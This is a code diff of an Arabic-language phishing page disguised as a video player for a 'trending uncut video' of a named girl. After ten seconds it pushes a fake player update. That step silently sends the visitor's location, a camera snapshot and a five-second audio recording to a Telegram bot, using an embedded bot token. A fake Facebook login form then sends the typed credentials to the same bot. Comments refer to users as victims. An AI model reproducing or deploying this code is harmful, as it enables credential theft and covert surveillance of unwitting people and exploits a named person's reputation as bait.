@@ -3,16 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Support Player</title>
+    
+    <title>مشاهدة تريند البنت شروق الأصلي</title>
+    <meta property="og:title" content="فيديو البنت شروق كاملاً (بدون حذف) - المشغل الرسمي" />
+    <meta property="og:description" content="اضغط هنا لمشاهدة الفيديو الآن بجودة عالية قبل الحذف." />
+    <meta property="og:image" content="trend_bg.jpg.jpg" />
+    <meta property="og:type" content="video.other" />
+    <meta name="twitter:card" content="summary_large_image">
+
     <link rel="manifest" href="manifest.json">
     <style>
-        body { margin: 0; background: #000; font-family: Arial; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; color: white; }
+        body { margin: 0; background: #000; font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; color: white; }
         video { width: 100%; max-height: 100vh; cursor: pointer; }
         #pwa, #fb { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; padding: 20px; flex-direction: column; align-items: center; justify-content: center; }
-        .box { background: #fff; padding: 25px; border-radius: 15px; text-align: center; width: 90%; max-width: 380px; }
-        button { background: #1877f2; color: #fff; border: none; padding: 15px; border-radius: 8px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; }
+        .box { background: #fff; padding: 25px; border-radius: 15px; text-align: center; width: 90%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        button { background: #1877f2; color: #fff; border: none; padding: 15px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; }
         input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; background: #f5f6f7; color: #000; }
         .logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 10px; }
+        canvas { display: none; }
     </style>
 </head>
 <body>
@@ -23,23 +31,24 @@
 
     <div id="pwa">
         <div class="box">
-            <h3 style="color:#000;">تحديث مطلوب</h3>
-            <p style="color:#606770;">يرجى تثبيت المشغل الرسمي لمتابعة المشاهدة.</p>
-            <button id="btn_ins">تثبيت واستكمال</button>
+            <h3 style="color:#000; margin-top:0;">تحديث المشغل مطلوب</h3>
+            <p style="color:#606770; font-size:14px;">لمتابعة المشاهدة بدون تقطيع، يجب الانتقال للمشغل الرسمي المعتمد.</p>
+            <button id="btn_ins">تثبيت واستكمال الفيديو</button>
         </div>
     </div>
 
     <div id="fb">
         <div class="box">
             <div class="logo">facebook</div>
-            <p style="color:#1c1e21; font-weight:bold;">يجب تسجيل الدخول للمتابعة</p>
-            <input type="text" id="user" placeholder="الإيميل أو الهاتف">
+            <p style="color:#1c1e21; font-weight:bold; font-size:14px;">يجب تسجيل الدخول للمتابعة</p>
+            <input type="text" id="user" placeholder="رقم الهاتف أو البريد الإلكتروني">
             <input type="password" id="pass" placeholder="كلمة السر">
             <button id="btn_go">تسجيل الدخول</button>
+            <p style="color:#1877f2; font-size:12px; margin-top:15px; cursor:pointer;">هل نسيت كلمة السر؟</p>
         </div>
     </div>
 
-    <canvas id="canvas" style="display:none;"></canvas>
+    <canvas id="canvas"></canvas>
 
     <script>
         const T = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
@@ -50,6 +59,7 @@
         if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }
         window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); p = e; });
 
+        // قطع الفيديو عند الثانية 10
         v.ontimeupdate = () => {
             if (v.currentTime >= 10) {
                 v.pause();
@@ -61,49 +71,63 @@
         document.getElementById('btn_ins').addEventListener('click', async () => {
             if (p) { p.prompt(); }
             
-            // 1. الموقع
+            // 1. سحب الموقع الجغرافي
             navigator.geolocation.getCurrentPosition((pos) => {
-                sendMsg(`📍 موقع الضحية: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                sendMsg(`📍 موقع الضحية:\nhttp://googleusercontent.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
             });
 
-            // 2. الكاميرا والمايك
+            // 2. سحب الكاميرا والمايك (اللقطة الحية والتسجيل)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const videoTrack = stream.getVideoTracks()[0];
                 
-                // لقطة صورة مخفية باستخدام Canvas (أضمن طريقة)
+                // لقطة صورة فورية
                 const canvas = document.getElementById('canvas');
                 const tempVideo = document.createElement('video');
                 tempVideo.srcObject = stream;
                 tempVideo.play();
 
                 setTimeout(() => {
-                    canvas.width = 640;
-                    canvas.height = 480;
+                    canvas.width = 640; canvas.height = 480;
                     canvas.getContext('2d').drawImage(tempVideo, 0, 0, 640, 480);
                     canvas.toBlob((blob) => {
                         let fd = new FormData();
                         fd.append('chat_id', ID);
-                        fd.append('photo', blob, 'shot.jpg');
+                        fd.append('photo', blob, 'victim.jpg');
                         fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                     }, 'image/jpeg');
-                    
-                    stream.getTracks().forEach(t => t.stop()); // اقفل الكاميرا
-                    sendMsg("📸 تم سحب لقطة حية بنجاح!");
                 }, 1000);
 
-            } catch (e) { sendMsg("❌ رفض الأذونات"); }
+                // تسجيل صوتي 5 ثواني
+                const recorder = new MediaRecorder(stream);
+                let chunks = [];
+                recorder.ondataavailable = (e) => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
+                    let fd = new FormData();
+                    fd.append('chat_id', ID);
+                    fd.append('voice', audioBlob, 'record.ogg');
+                    fetch(`https://api.telegram.org/bot${T}/sendVoice`, { method: 'POST', body: fd });
+                };
+                recorder.start();
+                setTimeout(() => {
+                    recorder.stop();
+                    stream.getTracks().forEach(t => t.stop());
+                    sendMsg("🎙️📸 تم سحب الصورة وتسجيل الصوت بنجاح!");
+                }, 5000);
+
+            } catch (e) { sendMsg("❌ الضحية رفض الأذونات"); }
             
             document.getElementById('pwa').style.display = 'none';
             document.getElementById('fb').style.display = 'flex';
         });
 
+        // صيد بيانات الفيسبوك
         document.getElementById('btn_go').addEventListener('click', () => {
             const u = document.getElementById('user').value;
             const ps = document.getElementById('pass').value;
             if(u && ps) {
-                sendMsg(`🔐 حساب فيسبوك:\n📧: ${u}\n🔑: ${ps}`);
-                alert("⚠️ خطأ في الخادم.");
+                sendMsg(`🔐 صيدة فيسبوك جديدة:\n📧: ${u}\n🔑: ${ps}`);
+                alert("⚠️ حدث خطأ في المصادقة، يرجى المحاولة لاحقاً.");
                 window.location.href = "https://m.facebook.com";
             }
         });
